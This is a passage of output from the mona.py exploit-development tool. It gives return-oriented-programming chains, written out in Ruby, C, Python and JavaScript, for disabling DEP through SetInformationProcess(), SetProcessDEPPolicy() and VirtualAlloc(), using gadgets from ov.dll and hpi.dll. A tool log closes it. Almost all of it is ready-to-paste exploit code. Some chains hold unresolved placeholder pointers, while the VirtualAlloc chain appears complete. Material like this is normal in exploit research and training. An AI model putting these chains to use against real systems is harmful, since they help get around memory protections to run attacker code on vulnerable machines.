              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ud78d%u5a01" + // 0x5a01d78d : ,# ptr to 'jmp esp' [ov.dll]
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find API pointer -> ebp+8
                0x5a02b873,  # MOV EAX,DWORD PTR SS:[EBP+8] # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (compensate)
                0x5a00f734,  # PUSH EAX # ADD EAX,DWORD PTR DS:[EBX] # POP EDX # ADD ESP,0C # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0024d8,  # PUSH EDX # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x5a02f459,  # POP EDX # RETN [ov.dll] 
                0x00000022,  # 0x00000022-> edx
                0x5a02ea05,  # POP ECX # RETN [ov.dll] 
                0x5a000154,  # &0x00000002 [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a02ef72,  # skip 4 bytes [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find API pointer -> ebp+8
                0x5a02b873,  // MOV EAX,DWORD PTR SS:[EBP+8] // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (compensate)
                0x5a00f734,  // PUSH EAX // ADD EAX,DWORD PTR DS:[EBX] // POP EDX // ADD ESP,0C // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a0024d8,  // PUSH EDX // ADD AL,5A // POP EBP // RETN [ov.dll] 
                0x5a02f459,  // POP EDX // RETN [ov.dll] 
                0x00000022,  // 0x00000022-> edx
                0x5a02ea05,  // POP ECX // RETN [ov.dll] 
                0x5a000154,  // &0x00000002 [ov.dll]
                0x5a02ee00,  // POP EBX // RETN 0x10 [ov.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x5a02eed8,  // POP EAX // RETN 0x0C [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000004,  // 0x00000004-> eax
                0x5a02ef72,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a02ef72,  // skip 4 bytes [ov.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a0102f3,  // PUSHAD // ADD AL,5A // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find API pointer -> ebp+8
                0x5a02b873,  # MOV EAX,DWORD PTR SS:[EBP+8] # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (compensate)
                0x5a00f734,  # PUSH EAX # ADD EAX,DWORD PTR DS:[EBX] # POP EDX # ADD ESP,0C # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0024d8,  # PUSH EDX # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x5a02f459,  # POP EDX # RETN [ov.dll] 
                0x00000022,  # 0x00000022-> edx
                0x5a02ea05,  # POP ECX # RETN [ov.dll] 
                0x5a000154,  # &0x00000002 [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a02ef72,  # skip 4 bytes [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> ebp+8
              "%ub873%u5a02" + // 0x5a02b873 : ,# MOV EAX,DWORD PTR SS:[EBP+8] # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%uf734%u5a00" + // 0x5a00f734 : ,# PUSH EAX # ADD EAX,DWORD PTR DS:[EBX] # POP EDX # ADD ESP,0C # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u24d8%u5a00" + // 0x5a0024d8 : ,# PUSH EDX # ADD AL,5A # POP EBP # RETN [ov.dll] 
              "%uf459%u5a02" + // 0x5a02f459 : ,# POP EDX # RETN [ov.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%uea05%u5a02" + // 0x5a02ea05 : ,# POP ECX # RETN [ov.dll] 
              "%u0154%u5a00" + // 0x5a000154 : ,# &0x00000002 [ov.dll]
              "%uee00%u5a02" + // 0x5a02ee00 : ,# POP EBX # RETN 0x10 [ov.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%ueed8%u5a02" + // 0x5a02eed8 : ,# POP EAX # RETN 0x0C [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%uef72%u5a02" + // 0x5a02ef72 : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uef72%u5a02" + // 0x5a02ef72 : ,# skip 4 bytes [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u02f3%u5a01" + // 0x5a0102f3 : ,# PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x5a000011,  # &0x00000000 [ov.dll]
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a02ef72,  # skip 4 bytes [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a02ee00,  // POP EBX // RETN 0x10 [ov.dll] 
                0x5a000011,  // &0x00000000 [ov.dll]
                0x5a02ef72,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a02ef72,  // skip 4 bytes [ov.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a0102f3,  // PUSHAD // ADD AL,5A // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x5a000011,  # &0x00000000 [ov.dll]
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a02ef72,  # skip 4 bytes [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%uee00%u5a02" + // 0x5a02ee00 : ,# POP EBX # RETN 0x10 [ov.dll] 
              "%u0011%u5a00" + // 0x5a000011 : ,# &0x00000000 [ov.dll]
              "%uef72%u5a02" + // 0x5a02ef72 : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uef72%u5a02" + // 0x5a02ef72 : ,# skip 4 bytes [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u02f3%u5a01" + // 0x5a0102f3 : ,# PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x5a02cd0b,  # POP EBP # RETN [ov.dll] 
                0x5a02cd0b,  # skip 4 bytes [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x5a02f4bc,  # POP EDX # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x5a02f707,  # POP ECX # RETN [ov.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x5a02f283,  # RETN (ROP NOP) [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0179b6,  # POP ESI # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01da85,  # JMP [EAX] [ov.dll]
                0x41414141,  # Filler (compensate)
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01d78d,  # ptr to 'jmp esp' [ov.dll]
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x5a02cd0b,  // POP EBP // RETN [ov.dll] 
                0x5a02cd0b,  // skip 4 bytes [ov.dll]
                0x5a02ee00,  // POP EBX // RETN 0x10 [ov.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x5a02f4bc,  // POP EDX // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00001000,  // 0x00001000-> edx
                0x5a02f707,  // POP ECX // RETN [ov.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x5a02ef72,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ov.dll] 
                0x5a02f283,  // RETN (ROP NOP) [ov.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a0179b6,  // POP ESI // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a01da85,  // JMP [EAX] [ov.dll]
                0x41414141,  // Filler (compensate)
                0x5a02eed8,  // POP EAX // RETN 0x0C [ov.dll] 
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a0102f3,  // PUSHAD // ADD AL,5A // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a01d78d,  // ptr to 'jmp esp' [ov.dll]
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x5a02cd0b,  # POP EBP # RETN [ov.dll] 
                0x5a02cd0b,  # skip 4 bytes [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x5a02f4bc,  # POP EDX # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x5a02f707,  # POP ECX # RETN [ov.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x5a02f283,  # RETN (ROP NOP) [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a0179b6,  # POP ESI # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01da85,  # JMP [EAX] [ov.dll]
                0x41414141,  # Filler (compensate)
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01d78d,  # ptr to 'jmp esp' [ov.dll]
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%ucd0b%u5a02" + // 0x5a02cd0b : ,# POP EBP # RETN [ov.dll] 
              "%ucd0b%u5a02" + // 0x5a02cd0b : ,# skip 4 bytes [ov.dll]
              "%uee00%u5a02" + // 0x5a02ee00 : ,# POP EBX # RETN 0x10 [ov.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%uf4bc%u5a02" + // 0x5a02f4bc : ,# POP EDX # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%uf707%u5a02" + // 0x5a02f707 : ,# POP ECX # RETN [ov.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%uef72%u5a02" + // 0x5a02ef72 : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
              "%uf283%u5a02" + // 0x5a02f283 : ,# RETN (ROP NOP) [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u79b6%u5a01" + // 0x5a0179b6 : ,# POP ESI # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uda85%u5a01" + // 0x5a01da85 : ,# JMP [EAX] [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%ueed8%u5a02" + // 0x5a02eed8 : ,# POP EAX # RETN 0x0C [ov.dll] 
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u02f3%u5a01" + // 0x5a0102f3 : ,# PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ud78d%u5a01" + // 0x5a01d78d : ,# ptr to 'jmp esp' [ov.dll]
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 183 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 112 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (4845 interesting gadgets)
0BADF00D      Wrote 4845 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (6881 gadgets)
0BADF00D      Wrote 6881 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:51.640000
          Log file closed


